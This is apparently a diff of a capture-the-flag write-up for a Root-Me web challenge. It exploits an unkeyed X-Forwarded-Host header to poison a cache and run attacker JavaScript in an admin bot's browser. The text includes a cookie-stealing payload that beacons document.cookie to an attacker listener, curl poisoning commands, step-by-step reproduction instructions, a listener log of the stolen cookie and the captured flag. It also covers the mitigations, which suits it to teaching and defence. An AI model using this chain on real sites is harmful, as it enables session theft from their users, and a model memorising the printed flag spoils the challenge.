@@ -1,13 +1,14 @@
 # Web Cache Poisoning — Unkeyed HTTP Header
 
 **Platform**: Root-Me Pro · **Category**: Web · **Difficulty**: Easy · **Points**: 250
+**Instance**: `instance-019fea4d-c372-72aa-ab50-7693c220dc5a.challenges.root-me.pro`
 
 > Given the large number of people using your username personalization application, the system
 > administrator recently implemented a cache system to reduce the load. When you mentioned he
 > should be careful how he implements it, he replied that it's just a cache and there's nothing
 > to worry about.
 
-**Status: vulnerability proven end-to-end; flag not yet captured** (see "Remaining step").
+**Status: solved — flag captured.**
 
 ---
 
@@ -25,107 +26,117 @@ Two routes:
 | Route | Function |
 |---|---|
 | `/` | username personalization — `GET /?username=X` |
-| `/report` | `POST path=...` → an admin bot (HeadlessChrome/124) visits the submitted path |
+| `/report` | `POST path=...` → an admin bot visits the submitted path |
 
-Submitting a username renders a results block:
+Submitting a username renders a results block containing a protocol-relative script tag whose
+host is built from the request's `Host` header rather than being hardcoded:
 
 ```html
-<h3>Waouuuw CANARY!!!</h3>
-<canvas id="my-canvas"></canvas>
-<script src="/static/js/index.min.js"></script>
-<script src="//instance-<id>.challenges.root-me.pro/static/js/confettis_manager.js"></script>
+<script src="//10.250.0.10:40100/static/js/confettis_manager.js"></script>
 ```
-
-That second `<script>` is the interesting one: an **absolute, protocol-relative URL whose host is
-built from a request header** rather than being hardcoded.
-
-## Finding the injection
-
-The username itself is HTML-escaped (`<b>` → `&lt;b&gt;`), so it's not the sink. The script host is:
-
-```bash
-curl -s "$U/?username=probe" -H "X-Forwarded-Host: evil.example.com" | grep confettis
-# <script src="//evil.example.com/static/js/confettis_manager.js"></script>
-```
-
-Several header names work (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `Forwarded`, …);
-an invented header (`X-Totally-Bogus`) does not, confirming a specific allow-list is consulted.
-
-The value is HTML-escaped too, so there is **no attribute breakout** —
-`x"></script><script>alert(1)</script>` comes back as `&#34;&gt;&lt;/script&gt;…`.
-You control the script's *origin* only. That is the intended bug.
 
 ## The vulnerability
 
-The cache key is **path + query string only**. `X-Forwarded-Host` influences the response body but
-is **not part of the cache key** — it is *unkeyed*. So a response generated from an attacker's
-header gets stored and replayed to everyone else:
+**Unkeyed `Host` header + reflected value = stored cache poisoning.**
 
-```bash
-# 1. attacker poisons
-curl -i "$U/?username=pwn" -H "X-Forwarded-Host: webhook.site/<uuid>"
-#    x-cache: miss   ... src="//webhook.site/<uuid>/static/js/confettis_manager.js"
+The cache key is path + `username` query value only — it does **not** include `Host`. The app
+trusts and reflects `Host` into the `<script src>` origin, so an attacker can:
 
-# 2. victim, sending NO header at all
-curl -i "$U/?username=pwn"
-#    x-cache: hit    ... src="//webhook.site/<uuid>/static/js/confettis_manager.js"   <-- poisoned
-```
+- Send one request to a given URL with a forged `Host` header.
+- The cache stores that poisoned response under the URL's normal key.
+- Every subsequent visitor to that URL — including ones sending a completely normal request — is
+  served the poisoned HTML, which loads `confettis_manager.js` from the attacker's chosen host.
 
-That second response is the whole finding: a user who never sent the header is served the
-attacker's script origin. Because a `<script src>` executes in the **including page's origin**,
-the attacker's JS runs as `instance-<id>.challenges.root-me.pro` — full XSS, with access to the
-admin's cookies and DOM.
+This escalates a header-reflection bug (usually low severity on its own) into **stored XSS against
+every visitor of the page**, including a privileged admin bot.
 
 ## Exploit chain
 
-1. Host a payload at the attacker origin. `webhook.site` answers *every* path, so it also serves
-   `/static/js/confettis_manager.js`. It **must** be returned as `application/javascript` —
-   `nosniff` is in play, so a `text/html` body will not execute.
-2. Poison the cache entry for `/?username=<uniq>` with `X-Forwarded-Host: <attacker host>`.
-3. Verify the poisoned copy is served *without* the header (`x-cache: hit`).
-4. `POST /report` with that path.
-5. The admin bot loads the cached, poisoned page and pulls the attacker's script.
+0. Brought up the Root-Me Pro WireGuard tunnel (`sudo wg-quick up rootme`) to get a callback IP
+   the challenge box can reach — here `172.29.7.32`. Targeted the **VPN endpoint**
+   `http://10.250.0.10:40100`, not the public HTTPS URL (see Pitfalls).
+1. Hosted a malicious `confettis_manager.js` on `172.29.7.32:8888`, exfiltrating via an
+   **absolute** URL:
+   ```js
+   var C = "http://172.29.7.32:8888";
+   new Image().src = C + "/x?cookie=" + encodeURIComponent(document.cookie);
+   // plus a synchronous XHR to the same host as a backup
+   ```
+2. Poisoned the cache for a throwaway URL (`/?username=<random>`) with:
+   ```bash
+   curl "http://10.250.0.10:40100/?username=<random>" -H "X-Forwarded-Host: 172.29.7.32:8888"
+   ```
+3. Confirmed poisoning: a plain follow-up request (no header override) to the same URL returned
+   `x-cache: hit` and still pointed the script tag at our host.
+4. Reported that URL via `POST /report` (`path=/?username=<random>`) to make the admin bot visit it.
+5. The bot rendered the poisoned page, ran our JS, and its `flag` cookie was exfiltrated to our
+   listener.
 
-Step 5 is confirmed: the collector logged
-`GET /static/js/confettis_manager.js` from
-`Mozilla/5.0 (X11; Linux x86_64) … HeadlessChrome/124.0.0.0 Safari/537.36`.
+Confirmed in `listener-solved.log`:
 
-`solve.py` in this folder automates 1–5 and polls for the callback:
-
-```bash
-python3 solve.py https://instance-<id>.challenges.root-me.pro
+```
+10.250.0.10 - - "GET /static/js/confettis_manager.js HTTP/1.1" 200 -
+10.250.0.10 - - "GET /s?hello=js-executed HTTP/1.1" 404 -
+10.250.0.10 - - "GET /s?cookie=flag%3DRM%7B7dd71a7a0b62263b31d0dc171fe048a6%7D HTTP/1.1" 404 -
 ```
 
-## Remaining step
+The cookie was `flag=RM{...}` and **not** `HttpOnly`, so `document.cookie` was sufficient — the
+same-origin re-read of `/` was belt-and-braces.
 
-The bot demonstrably fetches and would execute the payload; what is outstanding is reading the
-result back. Payload notes:
+Reproduce end to end:
 
-- An async `new Image()` beacon was **cancelled** when the headless bot tore the page down —
-  use a **synchronous `XMLHttpRequest`**, which blocks until the request is on the wire, or a
-  top-level `location = ...` navigation, which is the most reliable exfil of all.
-- The payload now fires a `/hello` beacon as its first statement to distinguish
-  "JS never executed" from "JS executed but exfil failed" — see the diagnosis matrix in `notes.md`.
-- Exfil both `document.cookie` *and* the admin's rendered `/`: the nav tab is labelled
-  **"Congrats"**, so the flag plausibly renders on `/` for the admin rather than sitting in a
-  (likely `HttpOnly`) cookie.
+```bash
+sudo wg-quick up rootme
+mkdir -p www/static/js && cp confettis_manager.js www/static/js/
+nohup python3 -m http.server 8888 --bind 172.29.7.32 --directory www > listener.log 2>&1 &
+./exploit.py --target http://10.250.0.10:40100 --listener 172.29.7.32:8888
+grep -oE 'RM(%7B|\{)[^}%]*(%7D|\})' listener.log
+```
+
+## Pitfalls that cost real time
+
+Two silent failures made earlier runs look like "the bot fetches the JS but nothing comes back":
+
+1. **Relative exfil URLs.** `new Image().src = "/x?..."` resolves against the **document** origin
+   (the challenge app), not the script's origin. Every beacon was quietly hitting the target
+   instead of the listener. Exfil URLs must be absolute.
+2. **Mixed active content.** The public instance is HTTPS; a `//172.29.7.32:8888` script tag on an
+   HTTPS page is mixed active content and the browser blocks it with no visible signal. The VPN
+   endpoint is plain HTTP, so the poisoned tag loads fine.
+
+Also worth knowing: username pages carry `max-age=30`, so a single poison request expires long
+before the bot arrives — `exploit.py` re-poisons on a 5s timer for the whole window. And the flag
+is **per-instance**, so a flag from an expired instance will not validate.
 
 ## Flag
 
-`RM{...}` — not yet captured.
+```
+RM{7dd71a7a0b62263b31d0dc171fe048a6}
+```
 
 ## Lessons
 
-- **A cache key that omits a header the response depends on turns a reflection into stored XSS.**
-  The bug is not the reflection; it is the mismatch between what varies the response and what
-  varies the cache key. The fix is either to stop trusting `X-Forwarded-Host` for URL generation
-  (use a fixed host / relative path) or to add `Vary: X-Forwarded-Host`.
-- Output encoding is not enough on its own. The header *was* HTML-escaped — escaping stopped the
-  attribute breakout but not the origin swap, because the attacker only needed to control the host
-  portion of a `<script src>`.
-- Probe unkeyed headers by poisoning with the header, then re-requesting **without** it. `x-cache:
-  hit` plus your injected value is the proof; anything less is just a reflection.
-- Cache-busting per test (`?username=<random>`) keeps probes from colliding — and confirms the
-  query string *is* keyed.
-- Headless bots kill the page fast. Prefer sync XHR / navigation over async beacons for exfil.
-- Root-Me Pro instances expire (~45 min) — poison, report, and collect in one automated run.
+- Any request header that influences a response body or headers must be part of the cache key, or
+  it must not be trusted/reflected at all.
+- `Host` (and its cousins `X-Forwarded-Host`, `X-Forwarded-Server`, etc.) is one of the most
+  commonly forgotten "unkeyed" inputs because it's assumed to be trustworthy/static — but any HTTP
+  client can set an arbitrary value.
+- A caching layer turns a single reflected-header bug into a **persistent, self-propagating XSS**:
+  one poisoned request affects every subsequent visitor until the TTL expires, no repeated
+  exploitation needed.
+- Output encoding on the *value* doesn't help when the attacker only needs to control the
+  *origin* of a `<script src>` — escaping stops attribute breakout, not an origin swap.
+- Probe unkeyed headers by poisoning with the header, then re-requesting **without** it; `x-cache:
+  hit` plus your injected value still present is the proof.
+- Without a routable callback IP (no VPN tunnel up), fall back to an in-scope oracle: point the
+  poisoned script src at a unique path on the target itself and read cache state (`hit`/`miss`) as
+  a signal channel. Getting the WireGuard tunnel (`sudo wg-quick up rootme`) up removed the need
+  for that workaround entirely — a real listener + direct cookie exfil was simpler.
+- **In injected JS, always use absolute exfil URLs.** A relative path resolves against the victim
+  page's origin, not yours — the request goes to the target and you see nothing. This failure mode
+  looks identical to "the payload never ran", which sends you debugging the wrong thing.
+- **Check the scheme before picking a callback host.** HTTP callback + HTTPS victim page = silently
+  blocked mixed content. When a challenge offers both a public HTTPS URL and a plain-HTTP VPN
+  endpoint, the VPN endpoint is the one that makes http:// payload origins work.
+- Fire a `hello` beacon as the payload's *first* statement. It separates "JS never executed" from
+  "JS executed but exfil failed" — which is exactly the ambiguity the two bugs above create.
